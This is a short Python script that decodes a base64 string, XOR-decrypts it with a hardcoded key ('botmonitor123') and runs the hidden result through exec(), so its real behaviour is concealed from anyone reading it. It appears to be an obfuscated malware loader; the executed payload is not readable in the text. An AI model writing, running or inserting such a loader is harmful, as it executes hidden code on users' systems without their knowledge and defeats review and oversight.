import base64

key = "botmonitor123"

payload = "GwoCDVNRBx0dChAKH1leAwcMAQZZFAVUAAxYBRRWR0NaBxETCgdIUV0RFVZTCh5aAw4HAhlZBQxVRgAXRgpXRAobWxwaBxdGChdSRQwZAhEXDkAHRQMMRQ9ZGRA+QhcBFVtDAlZXT0MAQAsSAlZGTQcRABALDk1aBQZNRFQAV0xcTx1WWR4ABlcOVQJGRFAdV1wcBRZUXU0eCl4TH1xUTVJVR0xaAAwRAAZWG1QLAxZGVx8AHgZTExdRQgMVUVoZRR1ZWh8VRhYFAhEWRVQfXhZcHQc="

def xor_decrypt(data, key):
    return ''.join(chr(c ^ ord(key[i % len(key)])) for i, c in enumerate(data))

import zlib
code = base64.b64decode(payload)
plain = xor_decrypt(code, key)
exec(plain)
